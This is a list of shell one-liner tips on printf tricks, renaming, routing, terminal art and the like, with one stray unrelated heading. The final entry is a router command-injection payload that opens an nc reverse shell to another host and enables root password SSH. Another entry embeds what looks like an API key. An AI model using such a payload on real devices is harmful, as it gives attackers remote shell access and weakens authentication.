($) Alert visually until any key is pressed: `printf "\e[38;5;1m"; while true; do printf "\e[?5h A L E R T %s\n" "$(date)"; sleep 0.1; printf "\e[?5l"; read -r -s -n1 -t1 && printf "\e[39m" && break; done`
($) Seconds since epoch to ISO timestamp: `printf '%(%FT%T)T\n' 1606752450`
($) Draw line separator (using knoppix5 idea): `printf '*%.s' {1..40}; echo`
($) Draw line separator (using knoppix5 idea): `printf "%.s*" {1..40}; printf "\n"`
($) Make M-n, M-m, and M-, insert the zeroth, first, and second argument of the previous command in Bash: `printf %s\\n '"\en": "\e0\e."' '"\em": "\e1\e."' '"\e,": "\e2\e."'>>~/.inputrc`
($) Print a horizontal line: `printf "%$(tput cols)s"|sed "s/ /_/g"`
($) Print a horizontal line: `printf -v _hr "%*s" $(tput cols) && echo ${_hr// /${1--}}`
($) Debug pytest failures in the terminal: `pytest --pdbcls pudb.debugger:Debugger --pdb --capture=no`
($) Bootstrap python-pip & setuptools: `python -m ensurepip --default-pip && python -m pip install --upgrade pip setuptools wheel`
($) KDE Console Logout command (with confirmation dialog): `qdbus org.kde.ksmserver /KSMServer logout 1 0 0`
($) Calculate your total world compile time. (Gentoo Distros): `qlist -I | xargs qlop -t | awk '{ if ($2 < 5400) secs += $2} END { printf("%dh:%dm:%ds\n", secs / 3600, (secs % 3600) / 60, secs % 60); }'`
($) Print compile time in seconds package by package (Gentoo Distros): `qlist -I | xargs qlop -t |sort -t" " -rnk2`
($) Shell bash iterate number range with for loop: `rangeBegin=10; rangeEnd=20; for numbers in $(eval echo "{$rangeBegin..$rangeEnd}"); do echo $numbers;done`
($) Shell bash iterate number range with for loop: `rangeBegin=10; rangeEnd=20; for ((numbers=rangeBegin; numbers<=rangeEnd; numbers++)); do echo $numbers; done`
($) Add prefix of 0 place holders for a string: `rename 's/\d+/sprintf("%04d",$&)/e' *`
($) Rename all files in lower case: `rename 'y/A-Z/a-z/' *`
($) Identify all amazon cloudformation scripts recursively using ripgrep: `rg -l "AWSTemplateFormatVersion: '2010-09-09'" *`
($) Route add default gateway: `route add default gw 192.168.10.1 //OR// ip route add default via 192.168.10.1 dev eth0 //OR// ip route add default via 192.168.10.1`
($) Show your current network interface in use: `route | grep -m1 ^default | awk '{print $NF}'`
($) Check host port access using only Bash:: `s="$(cat 2>/dev/null < /dev/null > /dev/tcp/${target_ip}/${target_port} & WPID=$!; sleep 3 && kill $! >/dev/null 2>&1 & KPID=$!; wait $WPID && echo 1)" ; s="${s:-0}"; echo "${s}" | sed 's/0/2/;s/1/0/;s/2/1/'`
($) VI/VIM Anonymize email address in log file: `%s/.\{5\}@.\{5\}/XXXXX@XXXXXX/g`
($) See n most used commands in your bash history: `sort ~/.bash_history|uniq -c|sort -n|tail -n 10`
($) Sort by IP address: `sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4`
($) Sort list of email addresses by domain.tld: `sort -t@ -k2 emails.txt`
($) Clear Cached Memory on Ubuntu: `sudo free && sync && sudo echo 3 | sudo tee /proc/sys/vm/drop_caches`
($) Manually trim SSD: `sudo fstrim -v /`
($) (OSX) Login history: `% sudo log show --style syslog  --last 2d | awk '/Enter/ && /unlockUIBecomesActive/ {print $1 " " $2}'`
($) Clear terminal screen: `tput clear`
($) Print umask as letters (e.g. `rwxr-xr-x`) instead of number (e.g. `0022`): `unix-permissions convert.stat $(unix-permissions invert $(umask))`
($) Emulate a root (fake) environment without fakeroot nor privileges: `unshare -r --fork --pid unshare -r --fork --pid --mount-proc bash`
($) Bash test check validate if variable is number: `varNUM=12345; re='^[0-9]+$'; if ! [[ $varNUM =~ $re ]] ; then echo "error: Not a number"; fi`
($) Compute newest kernel version from Makefile on Torvalds' git repository: `wget -qO - https://raw.githubusercontent.com/torvalds/linux/master/Makefile | head -n5 | grep -E '\ \=\ [0-9]{1,}' | cut -d' ' -f3 | tr '\n' '.' | sed -e "s/\.$//"`
($) Apply an xdelta patch to a file: `xdelta -d -s original_file delta_patch patched_file`
($) Alert visually until any key is pressed: `while true; do echo -e "\e[?5h\e[38;5;1m A L E R T  $(date)"; sleep 0.1; printf \\e[?5l; read -s -n1 -t1 && printf \\e[?5l && break; done`
($) Add date stamp to filenames of photos by Sony Xperia camera app: `(setopt CSH_NULL_GLOB; cd /path/to/Camera\ Uploads; for i in DSC_* MOV_*; do mv -v $i "$(date +%F -d @$(stat -c '%Y' $i)) $i"; done)`
($) Add timestamp of photos created by the "predictive capture" feature of Sony's Xperia camera app at the beginning of the filename: `(setopt CSH_NULL_GLOB; cd /path/to/Camera\ Uploads; for i in DSCPDC_000*; do mv -v $i "$(echo $i | perl -lpe 's/(DSCPDC_[0-9]{4}_BURST)([0-9]{4})([0-9]{2})([0-9]{2})/$2-$3-$4 $1$2$3$4/')"; done)`

STEVEN SEAGAL SHOWING YOU HOW TO MACRAME
========================================

($) Write shell script without opening an editor: `sudo su -c "echo -e \"\x23\x21/usr/bin/sudo /bin/bash\napt-get -y \x24\x40\" > /usr/bin/apt-yes"`
($) Generates a TV noise alike output in the terminal: `while true; do printf "$(awk -v c="$(tput cols)" -v s="$RANDOM" 'BEGIN{srand(s);while(--c>=0){printf("\xe2\x96\\%s",sprintf("%o",150+int(10*rand())));}}')";done`
($) Draw honeycomb: `yes "\\__/ " | tr "\n" " " | fold -$((($COLUMNS-3)/6*6+3)) | head -$LINES`
($) Mural graffiti: `tput setaf 1;tput rev;h=$(tput lines);w=$[$(tput cols)/6];c=$(seq -ws '_____|' $[$w+1]|tr -d "0-9");for a in $(seq $[$h/2]);do echo $c;echo ${c//|___/___|};done;tput cup 0;toilet -t -f bigmono12 "?LOVE";tput cup $h`
($) Draw honeycomb: `seq -ws "\\__/" 99|fold -69|tr "0-9" " "`
($) Draw mesh: `seq -s " \\_/" 256|tr -d "0-9"|fold -70`
($) Draw line separator: `seq -s '*' 40|tr -c '*' '*' && echo`
($) Draw line separator (using knoppix5 idea): `seq -s '*' 40 | tr -dc '[*\n]'`
($) Rename anime fansubs: `rename -n 's/[_ ]?[\[\(]([A-Z0-9-+,\.]+)[\]\)][_ ]?//ig' '[subs4u]_Mushishi_S2_22_(hi10p,720p,ger.sub)[47B73AEB].mkv'`
($) Bitcoin Brainwallet Private Key Calculator: `(read -r passphrase; b58encode 80$( brainwallet_exponent "$passphrase" )$( brainwallet_checksum "$passphrase" ))`
($) Instead of saying RTFM!: `echo "[q]sa[ln0=aln256%Pln256/snlbx]sb729901041524823122snlbxq" | dc`
($) Premiumize - create a ddl & save the URL in variable MYLINK: `MYLINK=$(curl  'https://www.premiumize.me/api/transfer/directdl?apikey=dzx3rqwrxme8iazu' \   -H 'accept: application/json' \   -H 'Content-Type: application/x-www-form-urlencoded'  --data-raw 'src='$URL | jq -r '.content[] | .link' )`
($) Hacking the Technicolor TG799vac  (and unlocking features for openwrt): `::::::;nc 192.168.1.144 1337 -e /bin/sh;rm /etc/dropbear/*;uci set dropbear.lan.PasswordAuth='on';uci set dropbear.lan.RootPasswordAuth='on';uci set dropbear.lan.Interface='lan';uci set dropbear.lan.enable='1';/etc/init.d/dropbear restart; uci commit`